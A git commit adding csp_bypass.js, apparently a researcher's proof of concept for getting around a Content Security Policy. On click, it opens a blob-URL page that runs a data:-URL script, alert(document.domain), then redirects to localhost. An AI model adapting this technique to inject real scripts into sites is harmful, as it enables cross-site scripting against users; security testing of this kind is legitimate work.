dbdc3f299d423b734d3619977951bf55fceac4b3
mrnoob790 <44310679+mrnoob790@users.noreply.github.com>
2025-08-29 17:41:30 +0530

    Add files via upload

---
+++ csp_bypass.js
@@ -0,0 +1,11 @@
+const blob = new Blob([`
+<html>
+	<body>
+		<script src="data:application/javascript,alert(document.domain);"></script>
+		<meta http-equiv="refresh" content="2;url=http://localhost/back.html">
+	</body>
+</html>`], {type : "text/html"});
+
+onclick = () => {
+	open(URL.createObjectURL(blob));
+}
